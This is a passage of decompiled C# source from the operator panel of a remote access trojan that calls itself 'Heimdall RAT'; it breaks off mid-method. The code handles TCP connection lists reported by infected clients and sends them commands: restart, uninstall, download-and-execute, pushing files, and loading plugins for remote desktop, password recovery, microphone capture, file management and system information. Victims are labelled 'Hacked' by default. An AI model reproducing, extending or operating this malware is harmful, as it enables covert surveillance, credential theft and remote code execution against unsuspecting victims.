									num94 = 0;
									while (true)
									{
										int num96 = num94;
										int num5 = num95;
										if (num96 <= num5)
										{
											if (systemM20.Established == 0)
											{
												systemM20.TCPC.get_Groups().Add("", "Established ( 0 )");
												SystemM systemM21 = systemM20;
												SystemM systemM22 = systemM21;
												systemM22.Established++;
											}
											object obj16 = systemM20.TCPC.get_Items().Add(new ListViewItem(new string[1] { array70[num94] }, 0, systemM20.TCPC.get_Groups().get_Item(systemM20.TCPC.get_Groups().get_Count() - 1)));
											NewLateBinding.LateSet(obj16, (Type)null, "ForeColor", new object[1] { Color.Green }, (string[])null, (Type[])null);
											object obj17 = NewLateBinding.LateGet(obj16, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null);
											object[] array21 = new object[1];
											object[] array71 = array21;
											string[] array19 = array70;
											string[] array72 = array19;
											int num39 = num94 + 1;
											array71[0] = array72[num39];
											object[] array17 = array21;
											object[] array73 = array17;
											bool[] array23 = new bool[1] { true };
											NewLateBinding.LateCall(obj17, (Type)null, "Add", array73, (string[])null, (Type[])null, array23, true);
											if (array23[0])
											{
												array19[num39] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array17[0]), typeof(string));
											}
											object obj18 = NewLateBinding.LateGet(obj16, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null);
											array21 = new object[1];
											object[] array74 = array21;
											array19 = array70;
											string[] array75 = array19;
											num39 = num94 + 2;
											array74[0] = array75[num39];
											array17 = array21;
											object[] array76 = array17;
											array23 = new bool[1] { true };
											NewLateBinding.LateCall(obj18, (Type)null, "Add", array76, (string[])null, (Type[])null, array23, true);
											if (array23[0])
											{
												array19[num39] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array17[0]), typeof(string));
											}
											object obj19 = NewLateBinding.LateGet(obj16, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null);
											array21 = new object[1];
											object[] array77 = array21;
											array19 = array70;
											string[] array78 = array19;
											num39 = num94 + 3;
											array77[0] = array78[num39];
											array17 = array21;
											object[] array79 = array17;
											array23 = new bool[1] { true };
											NewLateBinding.LateCall(obj19, (Type)null, "Add", array79, (string[])null, (Type[])null, array23, true);
											if (array23[0])
											{
												array19[num39] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array17[0]), typeof(string));
											}
											object obj20 = NewLateBinding.LateGet(obj16, (Type)null, "SubItems", new object[0], (string[])null, (Type[])null, (bool[])null);
											array21 = new object[1];
											object[] array80 = array21;
											array19 = array70;
											string[] array81 = array19;
											num39 = num94 + 4;
											array80[0] = array81[num39];
											array17 = array21;
											object[] array82 = array17;
											array23 = new bool[1] { true };
											NewLateBinding.LateCall(obj20, (Type)null, "Add", array82, (string[])null, (Type[])null, array23, true);
											if (array23[0])
											{
												array19[num39] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array17[0]), typeof(string));
											}
											num94 += 4;
											num93++;
											num94++;
											num94 += 0;
											continue;
										}
										break;
									}
								}
								catch (Exception projectError78)
								{
									ProjectData.SetProjectError(projectError78);
									ProjectData.ClearProjectError();
								}
								try
								{
									IEnumerator enumerator29 = default(IEnumerator);
									try
									{
										enumerator29 = systemM20.TCPC.get_Groups().GetEnumerator();
										while (enumerator29.MoveNext())
										{
											ListViewGroup val99 = (ListViewGroup)enumerator29.Current;
											if (Operators.CompareString(val99.get_Header(), "Established ( 0 )", false) == 0)
											{
												val99.set_Header("Established ( 0 )".Replace("0", num93.ToString()));
											}
										}
									}
									finally
									{
										if (enumerator29 is IDisposable)
										{
											(enumerator29 as IDisposable).Dispose();
										}
									}
								}
								catch (Exception projectError79)
								{
									ProjectData.SetProjectError(projectError79);
									ProjectData.ClearProjectError();
								}
							}
							if (!STRCOMP.Decode(array[3]).ToString()!.Contains("NTICBLAREVREV"))
							{
								string[] array83 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[3])), "TCPPlugin", -1, (CompareMethod)0);
								int num97 = 0;
								try
								{
									int num98 = 0;
									int num99 = array83.Length - 2;
									num98 = 0;
									while (true)
									{
										int num100 = num98;
										int num5 = num99;
										if (num100 <= num5)
										{
											if (systemM20.CloseWait == 0)
											{
												systemM20.TCPC.get_Groups().Add("", "Close Wait ( 0 )");
												SystemM systemM23 = systemM20;
												SystemM systemM22 = systemM23;
												systemM22.CloseWait++;
											}
											ListViewItem val100 = systemM20.TCPC.get_Items().Add(new ListViewItem(new string[1] { array83[num98] }, 1, systemM20.TCPC.get_Groups().get_Item(systemM20.TCPC.get_Groups().get_Count() - 1)));
											val100.set_ForeColor(Color.Red);
											val100.get_SubItems().Add(array83[num98 + 1]);
											val100.get_SubItems().Add(array83[num98 + 2]);
											val100.get_SubItems().Add(array83[num98 + 3]);
											val100.get_SubItems().Add(array83[num98 + 4]);
											num98 += 4;
											num97++;
											num98++;
											num98 += 0;
											continue;
										}
										break;
									}
								}
								catch (Exception projectError80)
								{
									ProjectData.SetProjectError(projectError80);
									ProjectData.ClearProjectError();
								}
								try
								{
									try
									{
										IEnumerator enumerator30 = default(IEnumerator);
										try
										{
											enumerator30 = systemM20.TCPC.get_Groups().GetEnumerator();
											while (enumerator30.MoveNext())
											{
												ListViewGroup val101 = (ListViewGroup)enumerator30.Current;
												if (Operators.CompareString(val101.get_Header(), "Close Wait ( 0 )", false) == 0)
												{
													val101.set_Header("Close Wait ( 0 )".Replace("0", num97.ToString()));
												}
											}
										}
										finally
										{
											if (enumerator30 is IDisposable)
											{
												(enumerator30 as IDisposable).Dispose();
											}
										}
									}
									catch (Exception projectError81)
									{
										ProjectData.SetProjectError(projectError81);
										ProjectData.ClearProjectError();
									}
								}
								catch (Exception projectError82)
								{
									ProjectData.SetProjectError(projectError82);
									ProjectData.ClearProjectError();
								}
							}
							if (!STRCOMP.Decode(array[4]).ToString()!.Contains("NTICBLAREVREV"))
							{
								string[] array84 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[4])), "TCPPlugin", -1, (CompareMethod)0);
								int num101 = 0;
								try
								{
									int num102 = 0;
									int num103 = array84.Length - 2;
									num102 = 0;
									while (true)
									{
										int num104 = num102;
										int num5 = num103;
										if (num104 <= num5)
										{
											if (systemM20.Listen == 0)
											{
												systemM20.TCPC.get_Groups().Add("", "Listening ( 0 )");
												SystemM systemM24 = systemM20;
												SystemM systemM22 = systemM24;
												systemM22.Listen++;
											}
											ListViewItem val102 = systemM20.TCPC.get_Items().Add(new ListViewItem(new string[1] { array84[num102] }, 5, systemM20.TCPC.get_Groups().get_Item(systemM20.TCPC.get_Groups().get_Count() - 1)));
											val102.set_ForeColor(Color.DarkSlateGray);
											val102.get_SubItems().Add(array84[num102 + 1]);
											val102.get_SubItems().Add(array84[num102 + 2]);
											val102.get_SubItems().Add(array84[num102 + 3]);
											val102.get_SubItems().Add(array84[num102 + 4]);
											num102 += 4;
											num101++;
											num102++;
											num102 += 0;
											continue;
										}
										break;
									}
								}
								catch (Exception projectError83)
								{
									ProjectData.SetProjectError(projectError83);
									ProjectData.ClearProjectError();
								}
								try
								{
									try
									{
										IEnumerator enumerator31 = default(IEnumerator);
										try
										{
											enumerator31 = systemM20.TCPC.get_Groups().GetEnumerator();
											while (enumerator31.MoveNext())
											{
												ListViewGroup val103 = (ListViewGroup)enumerator31.Current;
												if (Operators.CompareString(val103.get_Header(), "Listening ( 0 )", false) == 0)
												{
													val103.set_Header("Listening ( 0 )".Replace("0", num101.ToString()));
												}
											}
										}
										finally
										{
											if (enumerator31 is IDisposable)
											{
												(enumerator31 as IDisposable).Dispose();
											}
										}
									}
									catch (Exception projectError84)
									{
										ProjectData.SetProjectError(projectError84);
										ProjectData.ClearProjectError();
									}
								}
								catch (Exception projectError85)
								{
									ProjectData.SetProjectError(projectError85);
									ProjectData.ClearProjectError();
								}
							}
							if (!STRCOMP.Decode(array[5]).ToString()!.Contains("NTICBLAREVREV"))
							{
								string[] array85 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[5])), "TCPPlugin", -1, (CompareMethod)0);
								int num105 = 0;
								try
								{
									int num106 = 0;
									int num107 = array85.Length - 2;
									num106 = 0;
									while (true)
									{
										int num108 = num106;
										int num5 = num107;
										if (num108 <= num5)
										{
											if (systemM20.Time_Wait == 0)
											{
												systemM20.TCPC.get_Groups().Add("", "Time Wait ( 0 )");
												SystemM systemM25 = systemM20;
												SystemM systemM22 = systemM25;
												systemM22.Time_Wait++;
											}
											ListViewItem val104 = systemM20.TCPC.get_Items().Add(new ListViewItem(new string[1] { array85[num106] }, 6, systemM20.TCPC.get_Groups().get_Item(systemM20.TCPC.get_Groups().get_Count() - 1)));
											val104.set_ForeColor(Color.Orange);
											val104.get_SubItems().Add(array85[num106 + 1]);
											val104.get_SubItems().Add(array85[num106 + 2]);
											val104.get_SubItems().Add(array85[num106 + 3]);
											val104.get_SubItems().Add(array85[num106 + 4]);
											num106 += 4;
											num105++;
											num106++;
											num106 += 0;
											continue;
										}
										break;
									}
								}
								catch (Exception projectError86)
								{
									ProjectData.SetProjectError(projectError86);
									ProjectData.ClearProjectError();
								}
								try
								{
									try
									{
										IEnumerator enumerator32 = default(IEnumerator);
										try
										{
											enumerator32 = systemM20.TCPC.get_Groups().GetEnumerator();
											while (enumerator32.MoveNext())
											{
												ListViewGroup val105 = (ListViewGroup)enumerator32.Current;
												if (Operators.CompareString(val105.get_Header(), "Time Wait ( 0 )", false) == 0)
												{
													val105.set_Header("Time Wait ( 0 )".Replace("0", num105.ToString()));
												}
											}
										}
										finally
										{
											if (enumerator32 is IDisposable)
											{
												(enumerator32 as IDisposable).Dispose();
											}
										}
									}
									catch (Exception projectError87)
									{
										ProjectData.SetProjectError(projectError87);
										ProjectData.ClearProjectError();
									}
								}
								catch (Exception projectError88)
								{
									ProjectData.SetProjectError(projectError88);
									ProjectData.ClearProjectError();
								}
							}
							((Control)systemM20.TCPC).set_Enabled(true);
							((ToolStripItem)systemM20.ToolStripStatusLabel6).set_Text("List of tcp connections successfully created - TCP Connections : ( " + systemM20.TCPC.get_Items().get_Count() + " )");
							try
							{
								systemM20.TCPC.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
								return;
							}
							catch (Exception projectError89)
							{
								ProjectData.SetProjectError(projectError89);
								ProjectData.ClearProjectError();
								return;
							}
						}
						_data data35 = this.data;
						((Control)this).Invoke((Delegate)data35, new object[2] { sock, b });
					}
					else if (Operators.CompareString(array[0], "ERR", false) == 0)
					{
						SystemM systemM26 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[1]);
						((Control)systemM26.TCPC).set_Enabled(true);
						((ToolStripItem)systemM26.ToolStripStatusLabel6).set_Text("List of tcp connections unuccessfully created");
					}
					else if (Operators.CompareString(array[0], "KillTCPProcess", false) == 0)
					{
						SystemM systemM27 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]);
						try
						{
							IEnumerator enumerator33 = default(IEnumerator);
							try
							{
								enumerator33 = systemM27.TCPC.get_Items().GetEnumerator();
								while (enumerator33.MoveNext())
								{
									ListViewItem val106 = (ListViewItem)enumerator33.Current;
									if (Operators.CompareString(val106.get_SubItems().get_Item(1).get_Text(), SocketServer.Decode(array[1]), false) == 0)
									{
										val106.Remove();
									}
								}
							}
							finally
							{
								if (enumerator33 is IDisposable)
								{
									(enumerator33 as IDisposable).Dispose();
								}
							}
						}
						catch (Exception projectError90)
						{
							ProjectData.SetProjectError(projectError90);
							ProjectData.ClearProjectError();
						}
						((ToolStripItem)systemM27.ToolStripStatusLabel6).set_Text("All TCP Connections : " + systemM27.TCPC.get_Items().get_Count());
					}
					else
					{
						if (Operators.CompareString(array[0], "WirteLines", false) != 0)
						{
							return;
						}
						try
						{
							SystemM systemM28 = (SystemM)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]);
							if ((((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + array[2]) != null && Operators.CompareString(((ToolStripItem)systemM28.StartToolStripMenuItem1).get_Text(), "Stop", false) == 0) ? true : false)
							{
								((Control)systemM28.ResultCMD).set_Cursor((Cursor)null);
								((TextBoxBase)systemM28.ResultCMD).AppendText(Functions.DEB(array[1]) + "\r\n");
							}
							return;
						}
						catch (Exception projectError91)
						{
							ProjectData.SetProjectError(projectError91);
							ProjectData.ClearProjectError();
							return;
						}
					}
				}
			}
			catch (Exception projectError92)
			{
				ProjectData.SetProjectError(projectError92);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void TD(int S)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_Items().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					if (Conversions.ToDouble(val.get_ToolTipText()) == (double)S)
					{
						val.set_Tag((object)"0");
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string GTN()
	{
		if (DateTime.Now.Hour < 12)
		{
			return "Good morning sir : " + Environment.MachineName;
		}
		if (DateTime.Now.Hour < 17)
		{
			return "Good afternoon sir : " + Environment.MachineName;
		}
		if (DateTime.Now.Hour > 17)
		{
			return "Good evening sir : " + Environment.MachineName;
		}
		return "Good time to you sir : " + Environment.MachineName;
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		if (((ToolStripItem)blacklistlabel).get_Visible())
		{
			((ToolStripItem)blacklistlabel).set_Visible(false);
		}
		else
		{
			((ToolStripItem)blacklistlabel).set_Visible(true);
			((ToolStripItem)blacklistlabel).set_Text("Total Blocked ( 0 )".Replace("0", Convert.ToString(BlockedIP.get_Items().get_Count())));
		}
		((ToolStripItem)clientsloglabel).set_Text(GTN());
		((ToolStripItem)clientslabel).set_Text("Connected Clients : ( *C* ) | Selected Clients : ( *S* )".Replace("*C*", Conversions.ToString(listV1.get_Items().get_Count())).Replace("*S*", Conversions.ToString(listV1.get_SelectedItems().get_Count())));
		if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("TSF") != null)
		{
			TSDGR tSDGR = (TSDGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("TSF");
			((Form)tSDGR).set_Text("Torrent Seeder | @" + Environment.MachineName + " | Total Clients : ( 0 )".Replace("0", Conversions.ToString(tSDGR.Clients.get_Items().get_Count())));
		}
	}

	private void RestartToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = listV1.get_SelectedItems().GetEnumerator();
			while (enumerator.MoveNext())
			{
				ListViewItem val = (ListViewItem)enumerator.Current;
				s.Send(Conversions.ToInteger(val.get_ToolTipText()), "UNV" + Key + URC + Key + "UNI.UNI" + Key + Functions.RandomVariable(5, 8) + Key + "False" + Key + "True" + Key + "False" + Key + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False" + Key + "False" + Key + Functions.GenRandom(1, 10) + ".tmp" + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False");
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	private void DiconnectToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = listV1.get_SelectedItems().GetEnumerator();
			while (enumerator.MoveNext())
			{
				ListViewItem val = (ListViewItem)enumerator.Current;
				disconnected(Conversions.ToInteger(val.get_ToolTipText()));
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	private void CloseToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = listV1.get_SelectedItems().GetEnumerator();
			while (enumerator.MoveNext())
			{
				ListViewItem val = (ListViewItem)enumerator.Current;
				s.Send(Conversions.ToInteger(val.get_ToolTipText()), "UNV" + Key + URC + Key + "UNI.UNI" + Key + Functions.RandomVariable(5, 8) + Key + "True" + Key + "False" + Key + "False" + Key + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False" + Key + "False" + Key + Functions.GenRandom(1, 10) + ".tmp" + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False");
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		try
		{
			string text = Interaction.InputBox("Rename Client", "Name", "Hacked", -1, -1);
			if (Operators.CompareString(text, "", false) == 0)
			{
				return;
			}
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.get_SubItems().get_Item(1).set_Text(text);
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void FromLinkToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			if (listV1.get_SelectedItems().get_Count() > 0)
			{
				UPCGR uPCGR = new UPCGR();
				((Form)uPCGR).set_Text("Download and update");
				((Control)uPCGR).Show();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void FromDiskToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Expected O, but got Unknown
		//IL_0232: Unknown result type (might be due to invalid IL or missing references)
		if (listV1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		OpenFileDialog val = new OpenFileDialog();
		((CommonDialog)val).ShowDialog();
		if (((FileDialog)val).get_FileName().Length <= 0)
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val2 = (ListViewItem)enumerator.Current;
					val2.set_Tag((object)"Pause");
					s.Send(Conversions.ToInteger(val2.get_ToolTipText()), "UNV" + Key + URC + Key + "UNI.UNI" + Key + Functions.RandomVariable(5, 8) + Key + "False" + Key + "False" + Key + "False" + Key + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "True" + Key + "True" + Key + Functions.GenRandom(1, 10) + ".tmp" + Path.GetExtension(((FileDialog)val).get_FileName()) + Key + Convert.ToBase64String(File.ReadAllBytes(((FileDialog)val).get_FileName())) + Key + "False");
					val2.set_Tag((object)"0");
					disconnected(Conversions.ToInteger(val2.get_ToolTipText()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show("Erreur : " + ex2.Message, "Heimdall RAT ", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	private void UnistallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Invalid comparison between Unknown and I4
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		MsgBoxResult val = (MsgBoxResult)MessageBox.Show("This action will definitely Uninstall the selected users, Are You Sure ?", "Uninstall User(s)", (MessageBoxButtons)4, (MessageBoxIcon)32);
		if ((int)val != 6)
		{
			return;
		}
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = listV1.get_SelectedItems().GetEnumerator();
			while (enumerator.MoveNext())
			{
				ListViewItem val2 = (ListViewItem)enumerator.Current;
				s.Send(Conversions.ToInteger(val2.get_ToolTipText()), "UNV" + Key + URC + Key + "UNI.UNI" + Key + Functions.RandomVariable(5, 8) + Key + "False" + Key + "False" + Key + "False" + Key + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False" + Key + "False" + Key + Functions.GenRandom(1, 10) + ".tmp" + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False");
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	private void FromDiskToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Expected O, but got Unknown
		//IL_0221: Unknown result type (might be due to invalid IL or missing references)
		if (listV1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		OpenFileDialog val = new OpenFileDialog();
		((CommonDialog)val).ShowDialog();
		if (((FileDialog)val).get_FileName().Length <= 0)
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val2 = (ListViewItem)enumerator.Current;
					val2.set_Tag((object)"Pause");
					s.Send(Conversions.ToInteger(val2.get_ToolTipText()), "UNV" + Key + URC + Key + "UNI.UNI" + Key + Functions.RandomVariable(5, 8) + Key + "False" + Key + "False" + Key + "False" + Key + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False" + Key + "True" + Key + Functions.GenRandom(1, 10) + ".tmp" + Path.GetExtension(((FileDialog)val).get_FileName()) + Key + Convert.ToBase64String(File.ReadAllBytes(((FileDialog)val).get_FileName())) + Key + "False");
					val2.set_Tag((object)"0");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show("Erreur : " + ex2.Message, "Heimdall RAT ", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	private void FromLinkToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listV1.get_SelectedItems().get_Count() > 0)
			{
				UPCGR uPCGR = new UPCGR();
				((Form)uPCGR).set_Text("Download and execute");
				((Control)uPCGR).Show();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void RemoteDesktopToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		try
		{
			if (!File.Exists(Application.get_StartupPath() + "\\Plugins\\RD.dll"))
			{
				return;
			}
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Tag((object)"Pause");
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "IE" + Key + SocketServer.MD5(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\RD.dll")) + Key + val.get_ToolTipText() + Key + Conversions.ToString(true) + Key + "RD" + Key + "RD");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void PasswordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		try
		{
			if (!File.Exists(Application.get_StartupPath() + "\\Plugins\\PW.dll"))
			{
				return;
			}
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Tag((object)"Pause");
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "IE" + Key + SocketServer.MD5(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\PW.dll")) + Key + val.get_ToolTipText() + Key + Conversions.ToString(true) + Key + "PW" + Key + "PW");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void SystemInformationToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		try
		{
			if (!File.Exists(Application.get_StartupPath() + "\\Plugins\\SI.dll"))
			{
				return;
			}
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Tag((object)"Pause");
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "IE" + Key + SocketServer.MD5(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\SI.dll")) + Key + val.get_ToolTipText() + Key + Conversions.ToString(true) + Key + "SI" + Key + "SI");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void IPTrackerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "UNV" + Key + URC + Key + "UNI.UNI" + Key + Functions.RandomVariable(5, 8) + Key + "False" + Key + "False" + Key + "False" + Key + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False" + Key + "False" + Key + Functions.GenRandom(1, 10) + ".tmp" + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "True");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void MicrophoneToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		try
		{
			if (!File.Exists(Application.get_StartupPath() + "\\Plugins\\MC.dll"))
			{
				return;
			}
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "IE" + Key + SocketServer.MD5(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\MC.dll")) + Key + val.get_ToolTipText() + Key + Conversions.ToString(true) + Key + "MC" + Key + "MC");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void FileManagerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		try
		{
			if (!File.Exists(Application.get_StartupPath() + "\\Plugins\\FM.dll"))
			{
				return;
			}
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "IE" + Key + SocketServer.MD5(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\FM.dll")) + Key + val.get_ToolTipText() + Key + Conversions.ToString(true) + Key + "FM" + Key + "FM");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void PasstimeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
